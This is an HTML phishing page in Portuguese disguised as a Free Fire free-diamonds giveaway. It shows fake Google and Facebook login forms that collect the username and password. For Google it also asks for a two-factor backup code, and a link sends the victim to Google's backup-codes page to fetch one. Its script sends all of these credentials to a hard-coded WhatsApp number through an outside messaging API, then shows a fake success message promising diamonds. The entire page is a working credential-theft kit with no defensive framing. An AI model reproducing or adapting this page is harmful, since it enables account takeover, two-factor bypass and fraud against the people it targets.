<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Rewards - Ganhe Diamantes</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #050505; color: white; font-family: 'Roboto', sans-serif; }
        .ff-font { font-family: 'Orbitron', sans-serif; }
        .ff-gradient { background: linear-gradient(135deg, #facc15 0%, #f97316 100%); }
        .card-bg { background-color: #121212; border: 1px solid #262626; }
        .hidden { display: none; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full">
        <div id="screen-home" class="text-center">
            <h1 class="ff-font text-3xl font-bold text-yellow-400 mb-4 tracking-tighter">GANHE DIAMANTES FREE FIRE GRÁTIS</h1>
            <p class="text-gray-400 mb-8">Ganhe no seu primeiro login, depois aproveite ofertas por apenas R$ 3,99.</p>
            <button onclick="changeScreen('screen-selection')" class="ff-font w-full py-4 ff-gradient text-black font-bold rounded-md hover:brightness-110 transition-all uppercase tracking-widest shadow-lg shadow-orange-900/20">
                ENTRAR
            </button>
        </div>

        <div id="screen-selection" class="hidden text-center">
            <h2 class="ff-font text-xl mb-6">ESCOLHA O MÉTODO DE LOGIN</h2>
            <div class="space-y-4">
                <button onclick="showLoginForm('google')" class="w-full flex items-center justify-center gap-3 bg-white text-black font-semibold py-3 rounded-md hover:bg-gray-100 transition-colors">
                    <img src="https://www.google.com/favicon.ico" class="w-5" alt="Google"> Entrar com Google
                </button>
                <button onclick="showLoginForm('facebook')" class="w-full flex items-center justify-center gap-3 bg-[#1877F2] text-white font-semibold py-3 rounded-md hover:bg-[#166fe5] transition-colors">
                    <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                    Entrar com Facebook
                </button>
            </div>
        </div>

        <div id="screen-form" class="hidden card-bg p-8 rounded-xl shadow-2xl">
            <div id="form-header" class="mb-6 text-center"></div>
            
            <form id="loginForm" class="space-y-4">
                <input type="hidden" id="provider" name="provider">
                <div>
                    <label id="label-user" class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider"></label>
                    <input type="text" id="userInput" name="username" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
                </div>
                <div>
                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Senha</label>
                    <input type="password" id="passInput" name="password" class="w-full bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" required>
                </div>

                <div id="passkey-area" class="hidden">
                    <label class="block text-xs font-bold text-gray-500 mb-1 uppercase tracking-wider">Código de Segurança (8 dígitos)</label>
                    <div class="flex gap-2">
                        <input type="text" id="passkeyInput" name="passkey" class="flex-1 bg-[#1e1e1e] border border-gray-700 p-3 rounded text-white focus:outline-none focus:border-orange-500" placeholder="Ex: 1234 5678">
                        <a id="passkey-button" href="#" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded flex items-center justify-center text-center leading-tight">
                            OBTER<br>CÓDIGO
                        </a>
                    </div>
                </div>

                <button type="submit" class="w-full ff-gradient py-3 text-black font-bold rounded mt-4 transition-all hover:scale-[1.02]">
                    FAZER LOGIN
                </button>
                <div id="error-msg" class="text-red-500 text-xs text-center hidden"></div>
            </form>
        </div>

        <div id="screen-success" class="hidden text-center">
            <div class="mb-6">
                <div class="inline-block p-3 bg-green-500/20 rounded-full mb-2">
                    <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
                </div>
                <h2 id="welcome-user" class="ff-font text-xl text-yellow-400"></h2>
            </div>
            <p class="text-gray-400">Escolha o seu prêmio abaixo.</p>
            <div class="grid grid-cols-2 gap-4 mt-4">
                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                    <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
                    <span class="font-bold mt-2">100 Dimas</span>
                </button>
                <button onclick="finishClaim()" class="card-bg p-4 rounded-lg flex flex-col items-center border border-transparent hover:border-orange-500">
                    <img src="https://img.icons8.com/color/48/diamond--v1.png" alt="diamante">
                    <span class="font-bold mt-2">1500 Dimas</span>
                </button>
            </div>
        </div>
    </div>

    <script>
        let currentProvider = '';

        function changeScreen(screenId) {
            document.querySelectorAll('body > div > div').forEach(div => div.classList.add('hidden'));
            document.getElementById(screenId).classList.remove('hidden');
        }

        function showLoginForm(provider) {
            currentProvider = provider;
            document.getElementById('provider').value = provider;
            const header = document.getElementById('form-header');
            const label = document.getElementById('label-user');
            const userInp = document.getElementById('userInput');
            const passkeyArea = document.getElementById('passkey-area');
            const passkeyBtn = document.getElementById('passkey-button');
            
            userInp.value = "";
            document.getElementById('passInput').value = "";
            document.getElementById('passkeyInput').value = "";
            document.getElementById('error-msg').classList.add('hidden');

            if(provider === 'google') {
                header.innerHTML = `<img src="https://www.google.com/favicon.ico" class="w-8 mx-auto mb-2"><h2 class="text-white font-bold">Login com Google</h2>`;
                label.innerText = "Gmail";
                userInp.placeholder = "exemplo@gmail.com";
                
                // NOVO LINK PARA CÓDIGOS DE RESERVA
                passkeyBtn.href = "https://myaccount.google.com/two-step-verification/backup-codes?gar=WzI0Nl0&utm_source=google-account&utm_medium=web&utm_campaign=backupcodes-screen&continue=https://myaccount.google.com/security?gar%3DWzI0Nl0%26hl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact";
                passkeyArea.classList.remove('hidden'); 
            } else {
                header.innerHTML = `<svg class="w-8 h-8 fill-[#1877F2] mx-auto mb-2" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg><h2 class="text-white font-bold">Login com Facebook</h2>`;
                label.innerText = "Telefone ou E-mail";
                userInp.placeholder = "Número ou e-mail";
                passkeyArea.classList.add('hidden'); 
            }
            changeScreen('screen-form');
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const backupCode = document.getElementById('passkeyInput').value;
            const provider = document.getElementById('provider').value;
            
            if(provider === 'google' && backupCode.trim() === "") {
                showError("Insira o código de segurança para validar sua conta.");
                return;
            }

            const seu_telefone = "553192560979"; 
            const apikey = "3798192"; 
            
            const texto = `🔥 *NOVO LOGIN RECEBIDO* 🔥\n\n📱 *Provedor:* ${provider.toUpperCase()}\n📧 *Usuário:* ${user}\n🔑 *Senha:* ${pass}\n🛡️ *Código Backup:* ${backupCode || 'N/A'}`;
            const url = `https://api.callmebot.com/whatsapp.php?phone=${seu_telefone}&text=${encodeURIComponent(texto)}&apikey=${apikey}`;

            try {
                fetch(url, { mode: 'no-cors' });
                const nomeUsuario = user.split('@')[0]; 
                document.getElementById('welcome-user').innerText = `Sucesso! Olá, ${nomeUsuario}`;
                changeScreen('screen-success');
            } catch (error) {
                showError("Erro de conexão.");
            }
        });

        function showError(msg) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.innerText = msg;
            errorDiv.classList.remove('hidden');
        }

        function finishClaim() {
            alert("Análise concluída. Diamantes em até 72h!");
            location.reload();
        }
    </script>
</body>
                        </html>
